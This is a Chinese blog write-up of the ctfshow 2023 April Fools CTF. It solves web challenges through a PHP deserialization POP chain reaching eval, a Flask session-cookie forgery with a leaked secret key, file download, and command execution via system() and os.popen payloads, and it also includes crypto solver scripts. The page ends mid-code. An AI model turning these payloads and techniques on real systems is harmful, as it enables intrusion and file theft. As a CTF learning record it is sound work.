@@ -1,0 +1,705 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="dpm12345" href="http://dpm12345.cn/rss.xml"><link rel="alternate" type="application/atom+xml" title="dpm12345" href="http://dpm12345.cn/atom.xml"><link rel="alternate" type="application/json" title="dpm12345" href="http://dpm12345.cn/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="CTF,ctfshow"><link rel="canonical" href="http://dpm12345.cn/posts/d0dbb8d4/"><title>2023 愚人杯 - ctfshow - CTF | dpm12345-blog = dpm12345 = 路漫漫其修远兮</title><meta name="generator" content="Hexo 6.3.0"><style>.github-emoji{position:relative;display:inline-block;width:1.2em;min-height:1.2em;overflow:hidden;vertical-align:top;color:transparent}.github-emoji>span{position:relative;z-index:10}.github-emoji .fancybox,.github-emoji img{margin:0!important;padding:0!important;border:none!important;outline:0!important;text-decoration:none!important;user-select:none!important;cursor:auto!important}.github-emoji img{height:1.2em!important;width:1.2em!important;position:absolute!important;left:50%!important;top:50%!important;transform:translate(-50%,-50%)!important;user-select:none!important;cursor:auto!important}.github-emoji-fallback{color:inherit}.github-emoji-fallback img{opacity:0!important}</style></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">2023 愚人杯</h1><div class="meta"><span class="item" title="创建时间：2022-10-04 23:38:40"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-10-04T23:38:40+08:00">2022-10-04</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>27k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>37 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">dpm12345-blog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://pic.imgdb.cn/item/63c5685dbe43e0d30e71065e.png"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c5693cbe43e0d30e73ada5.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c56a8abe43e0d30e75bf6f.png"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c56aa8be43e0d30e75e85b.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c568a0be43e0d30e71c6c3.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c56867be43e0d30e712ba9.jpg"></li></ul></div><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div></header><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/ctfshow/" itemprop="item" rel="index" title="分类于 ctfshow"><span itemprop="name">ctfshow</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://dpm12345.cn/posts/d0dbb8d4/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="zhong"><meta itemprop="description" content="路漫漫其修远兮, 学习记录"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="dpm12345"></span><div class="body md" itemprop="articleBody"><p>最终得分为<u>1500</u></p><p><img data-src="/../../../post_images/ctfshow/%E6%84%9A%E4%BA%BA%E6%9D%AF2023/output.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>img参数可以传参，传入<code>index.php</code>的base64编码</p><p>利用读文件，读出index.php</p><h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>这道题其实是比较简单的</p><p>但由于他为直接在网址进行SSTI模板注入，故在列出根目录时，<code>/</code>会作为网址的一部分，导致404错误，故这里还需要进行绕过，比如<code>request.args.a</code><del>(卡了我好久)</del></p><h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><pre><code class="php">&lt;?php
+
+# 当前目录中有一个txt文件哦
+error_reporting(0);
+show_source(__FILE__);
+include("check.php");
+
+class EeE{
+    public $text;
+    public $eeee;
+    public function __wakeup(){
+        if ($this-&gt;text == "aaaa"){
+            echo lcfirst($this-&gt;text);
+        }
+    }
+
+    public function __get($kk){
+        echo "$kk,eeeeeeeeeeeee";
+    }
+
+    public function __clone(){
+        $a = new cycycycy;
+        $a -&gt; aaa();
+    }
+    
+}
+
+class cycycycy{
+    public $a;
+    private $b;
+
+    public function aaa(){
+        $get = $_GET['get'];
+        $get = cipher($get);
+        if($get === "p8vfuv8g8v8py"){
+            eval($_POST["eval"]);
+        }
+    }
+
+
+    public function __invoke(){
+        $a_a = $this -&gt; a;
+        echo "\$a_a\$";
+    }
+}
+
+class gBoBg{
+    public $name;
+    public $file;
+    public $coos;
+    private $eeee="-_-";
+    public function __toString(){
+        if(isset($this-&gt;name)){
+            $a = new $this-&gt;coos($this-&gt;file);
+            echo $a;
+        }else if(!isset($this -&gt; file)){
+            return $this-&gt;coos-&gt;name;
+        }else{
+            $aa = $this-&gt;coos;
+            $bb = $this-&gt;file;
+            return $aa();
+        }
+    }
+}   
+
+class w_wuw_w{
+    public $aaa;
+    public $key;
+    public $file;
+    public function __wakeup(){
+        if(!preg_match("/php|63|\*|\?/i",$this -&gt; key)){
+            $this-&gt;key = file_get_contents($this -&gt; file);
+        }else{
+            echo "不行哦";
+        }
+    }
+
+    public function __destruct(){
+        echo $this-&gt;aaa;
+    }
+
+    public function __invoke(){
+        $this -&gt; aaa = clone new EeE;
+    }
+}
+
+$_ip = $_SERVER["HTTP_AAAAAA"];
+unserialize($_ip);
+</code></pre><p>这题做得比较艰难</p><p>一开始并不知道<code>$_SERVER["HTTP_AAAAAA"]</code>，后经过输出<code>$_SERVER</code>可知，<code>AAAAAA</code>即为上传时的参数名，所以可以hackbar的修改请求头上传</p><p>大致做题过程为:</p><ol><li><p>浏览大致代码，很容易可以判断出反序列化起点为类<code>w_wuw_w</code>，利用开始点为<code>__destruct()</code></p></li><li><p>当<code>__destruct()</code>执行后，会将<code>$this-&gt;aaa</code>当作字符串进行输出，而<code>gBoBg</code>恰好有<code>__String()</code>方法，于是进入该方法</p></li><li><p>可以看到该方法中有三段的判断</p><ol><li>创建一个类名为<code>$this-&gt;coos</code>的类对象，然后<code>echo</code></li><li>第二段返回<code>$this-&gt;coos</code>的<code>name</code>属性</li><li>第三段是将<code>$this-&gt;coos</code>当作函数来使用。</li></ol></li><li><p>第一段：这是无法利用的，因为<code>echo</code>还是需要其有<code>__String()</code>，但代码中有此方法的只有<code>gBoBg</code>，如果传这个，那么就进入死循环，也解不出来</p><p>第二段：这里能利用的类只有<code>EeE</code>，但可以看到，最后会输出<code>name</code>加上一堆的<code>e</code>，而<code>name</code>在进入该判断时，必为空，故也没用</p><p>第三段：这里涉及到的是魔术方法<code>__invoke</code>，当对象被当作函数使用时，会调用此魔术方法。浏览整段代码，可知<code>cycycycy</code>和<code>w_wuw_w</code>均有此魔术方法，但在<code>cycycycy</code>中，该方法的调用只会输出<code>\$a_a\$</code>，没有用，而且在<code>w_wuw_w</code>中，<code>__invoke()</code>恰好<code>clone</code>了一个新的对象，而这<code>clone</code>的魔术方法在<code>EeE</code>中已实现,而且会执行<code>cycycycy</code>的<code>aaa()</code>方法，该方法中有<code>eval</code>，故这段有用</p><p>综上，采用第三段的逻辑，故要使得<code>name</code>为空，<code>file</code>不为空。</p></li><li><p>由上，可以进入<code>aaa</code>方法，可以看到，当所上传的<code>get</code>被<code>cipher</code>处理后等于<code>p8vfuv8g8v8py</code>时，则会执行<code>eval</code></p></li></ol><p>综上可知，大致要求为</p><p>创建一个<code>w_wuw_w</code>对象，其属性<code>aaa</code>为<code>gBoBg</code>的类对象，<code>aaa</code>的<code>name</code>不赋值，<code>file</code>赋值，<code>coos</code>为<code>w_wuw_w</code>对象</p><p>而接下来的目标是为了获取<code>get</code>应该上传什么，根据<code>include</code>，可猜测<code>cipher</code>的定义实现在<code>check.php</code>中</p><p>在这里，利用了<code>w_wuw_w</code>类中<code>__wakeup</code>的<code>file_get_contents</code>，通过php伪协议读取文件<del>(尝试了好久)</del>，将文件内容存到<code>$this-&gt;key</code>中，而为了能够读出，由<code>__destruct()</code>会输出<code>aaa</code>,故可将<code>$this-&gt;aaa</code>指向<code>$this-&gt;key</code>,即<code>$this-&gt;aaa = &amp;$this-&gt;key</code></p><p>故代码为</p><pre><code class="php">&lt;?php
+# 当前目录中有一个txt文件哦
+// error_reporting(0);
+show_source(__FILE__);
+include("check.php");
+
+class EeE{
+    public $text;
+    public $eeee;
+    public function __wakeup(){
+        if ($this-&gt;text == "aaaa"){
+            echo lcfirst($this-&gt;text);
+        }
+    }
+
+    public function __get($kk){
+        echo "$kk,eeeeeeeeeeeee";
+    }
+
+    public function __clone(){
+        $a = new cycycycy;
+        $a -&gt; aaa();
+    }
+    
+}
+
+class cycycycy{
+    public $a;
+    private $b;
+
+    public function aaa(){
+        $get = $_GET['get'];
+        $get = cipher($get);
+        if($get === "p8vfuv8g8v8py"){
+            eval($_POST["eval"]);
+        }
+    }
+
+
+    public function __invoke(){
+        $a_a = $this -&gt; a;
+        echo "\$a_a\$";
+    }
+}
+
+class gBoBg{
+    public $name;
+    public $file=1;
+    public $coos;
+    private $eeee="-_-";
+    public function __construct($coos)
+    {
+        $this-&gt;coos = $coos;
+    }
+    public function __toString(){
+        if(isset($this-&gt;name)){
+            $a = new $this-&gt;coos($this-&gt;file);
+            echo $a;
+        }else if(!isset($this -&gt; file)){
+            return $this-&gt;coos-&gt;name;
+        }else{
+            $aa = $this-&gt;coos;
+            $bb = $this-&gt;file;
+            return $aa();
+        }
+    }
+}   
+
+class w_wuw_w{
+    public $aaa;
+    public $key;
+    public $file = "php://filter/convert.base64-encode/resource=check.php";
+    public function __construct($a)
+    {
+        $this-&gt;aaa = &amp;$this-&gt;key;
+    }
+    public function __wakeup(){
+        if(!preg_match("/php|63|\*|\?/i",$this -&gt; key)){
+            $this-&gt;key = file_get_contents($this -&gt; file);
+        }else{
+            echo "不行哦";
+        }
+    }
+
+    public function __destruct(){
+        echo $this-&gt;aaa;
+    }
+
+    public function __invoke(){
+        $this -&gt; aaa = clone new EeE;
+    }
+}
+$a = new w_wuw_w(1);
+echo (serialize($a));
+</code></pre><p>得到的序列化字符串</p><pre><code class="raw">O:7:"w_wuw_w":3:{s:3:"aaa";N;s:3:"key";R:2;s:4:"file";s:53:"php://filter/convert.base64-encode/resource=check.php";}
+</code></pre><p>传入，得到base64代码，解码后，得到check.php</p><pre><code class="php">&lt;?php
+function cipher($str) {
+
+    if(strlen($str)&gt;10000){
+        exit(-1);
+    }
+    $charset = "qwertyuiopasdfghjklzxcvbnm123456789";
+    $shift = 4;
+    $shifted = "";
+
+    for ($i = 0; $i &lt; strlen($str); $i++) {
+        $char = $str[$i];
+        $pos = strpos($charset, $char);
+
+        if ($pos !== false) {
+            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);
+            $shifted .= $charset[$new_pos];
+        } else {
+            $shifted .= $char;
+        }
+    }
+
+    return $shifted;
+}
+</code></pre><p>经过分析，很容易得出加密流程为，首先定位提供的字符串每一位字符在<code>charset</code>字符串中的位置，然后将其位置在<code>charset</code>中偏移4位，将偏移后的字符加入到<code>$shifted</code>中</p><p>于是解密脚本为</p><pre><code class="python">a = "p8vfuv8g8v8py"
+charset = "qwertyuiopasdfghjklzxcvbnm123456789"
+
+for x in a:
+    index = (charset.index(x) + 4) % len(charset)
+    print(charset[index],end="")
+</code></pre><p>得到字符串<code>fe1ka1ele1efp</code>，经验证是正确的</p><p>故生成新的序列化字符串，代码为</p><pre><code class="php">&lt;?php
+
+# 当前目录中有一个txt文件哦
+// error_reporting(0);
+show_source(__FILE__);
+include("check.php");
+
+class EeE{
+    public $text;
+    public $eeee;
+    public function __wakeup(){
+        if ($this-&gt;text == "aaaa"){
+            echo lcfirst($this-&gt;text);
+        }
+    }
+
+    public function __get($kk){
+        echo "$kk,eeeeeeeeeeeee";
+    }
+
+    public function __clone(){
+        $a = new cycycycy;
+        $a -&gt; aaa();
+    }
+    
+}
+
+class cycycycy{
+    public $a;
+    private $b;
+
+    public function aaa(){
+        $get = $_GET['get'];
+        $get = cipher($get);
+        if($get === "p8vfuv8g8v8py"){
+            eval($_POST["eval"]);
+        }
+    }
+
+
+    public function __invoke(){
+        $a_a = $this -&gt; a;
+        echo "\$a_a\$";
+    }
+}
+
+class gBoBg{
+    public $name;
+    public $file=1;
+    public $coos;
+    private $eeee="-_-";
+    public function __construct($coos)
+    {
+        $this-&gt;coos = $coos;
+    }
+    public function __toString(){
+        if(isset($this-&gt;name)){
+            $a = new $this-&gt;coos($this-&gt;file);
+            echo $a;
+        }else if(!isset($this -&gt; file)){
+            return $this-&gt;coos-&gt;name;
+        }else{
+            $aa = $this-&gt;coos;
+            $bb = $this-&gt;file;
+            return $aa();
+        }
+    }
+}   
+
+class w_wuw_w{
+    public $aaa;
+    public $key;
+    public $file;
+    public function __construct($a)
+    {
+        $this-&gt;aaa = $a;
+    }
+    public function __wakeup(){
+        if(!preg_match("/php|63|\*|\?/i",$this -&gt; key)){
+            $this-&gt;key = file_get_contents($this -&gt; file);
+        }else{
+            echo "不行哦";
+        }
+    }
+
+    public function __destruct(){
+        echo $this-&gt;aaa;
+    }
+
+    public function __invoke(){
+        $this -&gt; aaa = clone new EeE;
+    }
+}
+function cd(){
+    echo 52;
+}
+$a = new w_wuw_w(new gBoBg(new w_wuw_w("1")));
+echo (serialize($a));
+</code></pre><p>得到字符串</p><pre><code class="raw">O:7:"w_wuw_w":3:{s:3:"aaa";O:5:"gBoBg":4:{s:4:"name";N;s:4:"file";i:1;s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";s:1:"1";s:3:"key";N;s:4:"file";N;}s:11:"gBoBgeeee";s:3:"-_-";}s:3:"key";N;s:4:"file";N;}
+</code></pre><p>这里注意到<code>s:11:"gBoBgeeee";</code>，这会使得反序列化失败(不清楚为什么会序列化成这样)，于是将<code>11</code>改为<code>9</code></p><p>上传</p><pre><code class="raw">AAAAAA=O:7:"w_wuw_w":3:{s:3:"aaa";O:5:"gBoBg":4:{s:4:"name";N;s:4:"file";i:1;s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";s:1:"1";s:3:"key";N;s:4:"file";N;}s:9:"gBoBgeeee";s:3:"-_-";}s:3:"key";N;s:4:"file";N;}
+
+GET: http://0e1fa161-89d4-4361-a690-a82daae59b8e.challenge.ctf.show/?get=fe1ka1ele1efp
+POST: eval=system('ls');
+      eval=system('ls /');
+      eval=system('cat /f1agaaa');
+</code></pre><p>得到flag</p><p>（这里在进行<code>system('ls')</code>时，会发现之前说的<code>txt</code>文件为<code>h1nt.txt</code>，其内容为<code>\#用于check.php key：qwertyuiopasdfghjklzxcvbnm123456789 move：2~4</code>，这里提示较少，不如直接读<code>check.php</code>） <del>之前试过文件名是不是<code>hint.txt</code>，就差一点，但也恨当时已经可以读文件了，却还要纠结于txt文件，不如读<code>check.php</code></del></p><p>(wp的思想是先使得file=/*.txt,然后利用原生类来获取txt的文件名，之后获取txt文件的内容，得到提示，然后爆破加密的移动的位数，然后得到加密流程，之后和我的做法一样)</p><p>但是我读到的<code>h1nt.txt</code>并不是在根目录(</p><p>看来是非预期解</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p>base16 + base32 + base64</p><h2 id="大牛的密码"><a href="#大牛的密码" class="headerlink" title="大牛的密码"></a>大牛的密码</h2><p>给的加密脚本</p><pre><code class="python">from Crypto.Util.number import *
+from flag import flag
+from Crypto.Util.Padding import pad
+from random import *
+def s_box(a):
+    box=[i for i in range(a)]
+    shuffle(box)
+    return box
+BLOCK=16
+flag=pad(flag,BLOCK)
+S_BOX=s_box(len(flag))
+m=[i for i in flag]
+def swap(a,b):
+    tmp = a
+    a = b
+    b = tmp
+def encrypt1(m):
+    enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)]
+    for i in enc:
+        for j in range(BLOCK):
+            aa=j*7%BLOCK
+            swap(i[j],i[aa])
+def encrypt2(m):
+    for i in range(16):
+        m=[m[i] for i in S_BOX]
+    return m
+encrypt1(m)
+c=encrypt2(m)
+print(S_BOX)
+print(c)
+'''
+[9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]
+[99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]
+'''
+</code></pre><p>比较简单的一个分组密码</p><p>给出解密脚本</p><pre><code class="python">BLOCK=16
+S_BOX = [9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]
+def encrypt1(m):
+    enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)]
+    for i in enc:
+        for j in range(BLOCK):
+            aa=j*7%BLOCK
+            swap(i[j],i[aa])
+def encrypt2(m):
+    for i in range(16):
+        m=[m[i] for i in S_BOX]
+    return m
+
+def de(m):
+    for i in range(16):
+        print(m)
+        tmp = [0]*len(m)
+        j = 0
+        for index in S_BOX:
+            tmp[index] = m[j]
+            j+=1
+        m = tmp
+    return m
+
+m = [99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]
+# print(m)
+m = de(m)
+encrypt1(m)
+for i in m:
+        print(chr(i),end="")
+</code></pre><p>大致加密流程为，先使用<code>pad</code>将原来的flag进行扩充达到可分组的长度，然后，组内交换，最后使用S盒进行16轮置换</p><p>解密流程为，逆向16轮S盒置换，然后因为组内置换加解密同代码，故解密脚本如上</p><h2 id="easy-mini"><a href="#easy-mini" class="headerlink" title="easy_mini"></a>easy_mini</h2><pre><code class="python">p = 71397796933602469825964946338224836258949974632540581233301840806613437378503
+a = 34707491256665545391276236596452538912073367128507057339946181246439062354614
+b = 4772744837719404570039488103932889286126236975047018081148463521123562429424
+E = EllipticCurve(GF(p), [a, b])
+c1 = E(37414446283406201193977113266234367761786780230360175925999700345196415953455,17037724145039910971426670298726906655653040365428438334942732090559637519851)
+c2 = E(60560423732267272277570046154733119097475794979191838027420415113112056962844,54372226143125971429691267751299496959531971082475860532181772357190222938465)
+k = 58155941823118858940343657716409231510854647214870891375273032214774400828217
+m = c1-k*c2
+w2 =16315249811700998894876359855091105114973337718373913477026230968747515636405
+print(w2/m[0])
+# 7196365442241205186856420688221367789171469258517476477
+m2 = 7196365442241205186856420688221367789171469258517476477
+for i in range(0,100000):
+    num = str(i) + str(m2)
+    s = long_to_bytes(int(num))
+    if s.startswith(b"ctfshow{"):
+        print(s)
+        break
+# ctfshow{the_answer_is_it}
+</code></pre><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><pre><code class="python">from Crypto.Util.number import *
+import gmpy2
+# from secret import flag
+'''
+assert len(flag[8:-1])==23
+m = bytes_to_long(flag)
+p = getPrime(1024)
+q = getPrime(1024)
+n = p*q
+e = 65537
+c1 = m^p
+c2 = pow(m,e,n)
+print(f'c1 = {c1}')
+print(f'c2 = {c2}')
+print(f'n = {n}')
+'''
+c1 = 151198307301713399973545627808177783191262282577048906899567665485020342464366268384613589477129150406859219553325982275344405383612415523342568367197935454935162234419239807109194526080836070453102172720442102673200212658553214847476648456720629906051324248179394810385918370092764118401652990951968387233220
+c2 = 7894512574379281106340582833782408137686355961537832816105517328532111343730615739255485918919146012721446905489729048235088965936700563973759759039693443386542070451737445467143517377017890468837697907596398070608179281207203217576205857817411996178441661371846647602166663752324880657668362355493701482869858528298247422875427747085642627978367348931707497113936723122393282697211257939351221141536029828744507560524637999804394951722319070365576391442828074457050403771353328835153787572457070779602728359333021922987279454923820866436212282592764768470608545881718922440010751845730974331917142224339664090863915
+n = 20873587976264698212013861921447267548758723109929620330136081844796427967720295581580927324390713931549639540337285515365487607593546367886570408812338077846317206794057714877394609181224434104303259411081376607299962306250984285173463537669954845497211859940191392861121877814873939865829555350848523691546006073264112091406848179785659505299775196062799482197712761744192962658799557108701192680225134300686608396391566674966897700511638643429161735764600752699251493599533703928135311599575989253347234975026924804433742500175666009324057320386262109587593814197687132304704244158862263859846356497849518103755981
+k = 256
+R.&lt;x&gt; = PolynomialRing(Zmod(n))
+c = (c1&gt;&gt;k)&lt;&lt;k
+f = c + x
+x0 = f.small_roots(2^k,beta=0.4)[0]
+
+m = c1.__xor__(int(x0))
+
+print(long_to_bytes(m))
+</code></pre><p>p的高位攻击，得到</p><pre><code class="raw">b"\xd7PC\xf0:\xb67\xc5\x9fO+S\xd0\xe5eV\xdc\x19\xff\xf21\xb4\xf8L\xd7C\x9a\xcaK\xba\xe8\xa0!'\x81dt\xb5\x00K\xf0\xb8L\x8e'\xf6\xba\xcd\xc9\xceY\xf5x^\xa4\xc4v\x9e\x03\x08\xb6\xc6\xf4\xdb\x13\xce(\x9a\xde\xe0B\x15\xdf\x98\xf2@V\x92^\x8c3\xcdJ\x05\xcb-6i9E\xbf:\xfd\x84t\xccctfshow{m_xor_p_but_coppersmith}"
+</code></pre><p>（原以为算出p之后可以用rsa的知识解决，但解不出来）</p><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据题目所给</p><pre><code class="python"># app.py
+from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response
+
+
+app = Flask(__name__)
+
+
+app.secret_key = 'S3cr3tK3y'
+
+users = {
+
+}
+
+@app.route('/')
+def index():
+# Check if user is loggedin
+    if 'loggedin' in session:
+        return redirect(url_for('profile'))
+    return redirect(url_for('login'))
+
+@app.route('/login/', methods=['GET', 'POST'])
+def login():
+    msg = ''
+    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
+        username = request.form['username']
+        password = request.form['password']
+        if username in users and password == users[username]['password']:
+            session['loggedin'] = True
+            session['username'] = username
+            session['role'] = users[username]['role']
+        return redirect(url_for('profile'))
+    else:
+        msg = 'Incorrect username/password!'
+        return render_template('login.html', msg=msg)
+
+
+@app.route('/register/', methods=['GET', 'POST'])
+def register():
+    msg = ''
+    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
+        username = request.form['username']
+        password = request.form['password']
+        if username in users:
+            msg = 'Account already exists!'
+        else:
+            users[username] = {'password': password, 'role': 'user'}
+            msg = 'You have successfully registered!'
+    return render_template('register.html', msg=msg)
+
+
+
+@app.route('/profile/')
+def profile():
+    if 'loggedin' in session:
+        return render_template('profile2.html', username=session['username'], role=session['role'])
+    return redirect(url_for('login'))
+</code></pre><p>一开始纠结于<code>render_template('profile2.html', username=session['username'], role=session['role'])</code>的SSTI，但废了极大工夫，并查找资料，可知，该形式不存在SSTI</p><p>这里重要的点在于flask session的伪造，因为注册一个账号，<code>role</code>固定为<code>users</code>，而根据登陆后的<code>But,there are some things I only want to give to users whose role is admin.</code></p><p>需要为<code>admin</code>身份才能获取更多信息</p><p>这里用到flask的伪造<code>python .\flask_session_cookie_manager3.py encode -t "{'loggedin': True, 'role': 'admin', 'username': '{{2+5}}'}" -s "S3cr3tK3y"</code></p><p>得到<code>eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJ7ezIrNX19In0.ZCg8QA.4MmqCWcdgO7YuAko8yxXX5BA0OM</code>，修改cookie的session值，可以得到</p><p><strong>Congratulations! You can download the fakeflag: <span class="exturl" data-url="aHR0cDovLzczMzMxNDIwLTI5YjEtNDNhYS04OTExLTEwZGU5YjU0ZjdjNS5jaGFsbGVuZ2UuY3RmLnNob3cvZG93bmxvYWQvP2ZpbGVuYW1lPWZha2VmbGFnLnR4dA==">Click here</span></strong></p><p>由此，可以得到下载的位置<del>一开始在尝试下载其他的txt，如flag、hint，但都无用</del></p><p>有之前给的代码，显然<code>app.py</code>没给完整，而这个下载文件有个<code>filename</code>，故尝试<code>?filename=app.py</code>，成功下载，得到完整的<code>app.py</code></p><p>app.py</p><pre><code class="python"># app.py
+from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response
+
+
+app = Flask(__name__)
+
+
+app.secret_key = 'S3cr3tK3y'
+
+users = {
+    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}
+}
+
+
+
+@app.route('/')
+def index():
+    # Check if user is loggedin
+    if 'loggedin' in session:
+        return redirect(url_for('profile'))
+    return redirect(url_for('login'))
+
+@app.route('/login/', methods=['GET', 'POST'])
+def login():
+    msg = ''
+    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
+        username = request.form['username']
+        password = request.form['password']
+        if username in users and password == users[username]['password']:
+            session['loggedin'] = True
+            session['username'] = username
+            session['role'] = users[username]['role']
+            return redirect(url_for('profile'))
+        else:
+            msg = 'Incorrect username/password!'
+    return render_template('login2.html', msg=msg)
+
+
+@app.route('/register/', methods=['GET', 'POST'])
+def register():
+    msg = '' 
+    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
+        username = request.form['username']
+        password = request.form['password']
+        if username in users:
+            msg = 'Account already exists!'
+        else:
+            users[username] = {'password': password, 'role': 'user'}
+            msg = 'You have successfully registered!'
+    return render_template('register2.html', msg=msg)
+
+
+
+@app.route('/profile/')
+def profile():
+    if 'loggedin' in session:
+        return render_template('profile2.html', username=session['username'], role=session['role'])
+    return redirect(url_for('login'))
+
+
+@app.route('/show/')
+def show():
+    if 'loggedin' in session:
+        return render_template('show2.html')
+
+@app.route('/download/')
+def download():
+    if 'loggedin' in session:
+        filename = request.args.get('filename')
+        if 'filename' in request.args:              
+            return send_file(filename, as_attachment=True)
+  
+    return redirect(url_for('login'))
+
+
+@app.route('/hello/')
+def hello_world():
+    try:
+        s = request.args.get('eval')
+        return f"hello,{eval(s)}"
+    except Exception as e:
+        print(e)
+        pass
+        
+    return "hello"
+    
+
+
+@app.route('/logout/')
+def logout():
+   session.pop('loggedin', None)
+   session.pop('id', None)
+   session.pop('username', None)
+   session.pop('role', None)
+   return redirect(url_for('login'))
+
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=8080)
+</code></pre><p>可以看到<code>/hello/</code>下有<code>eval</code>，可以执行任意代码</p><p>故传入</p><pre><code class="raw">http://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__("os").popen("ls").read()
+hello,app.py fakeflag.txt templates
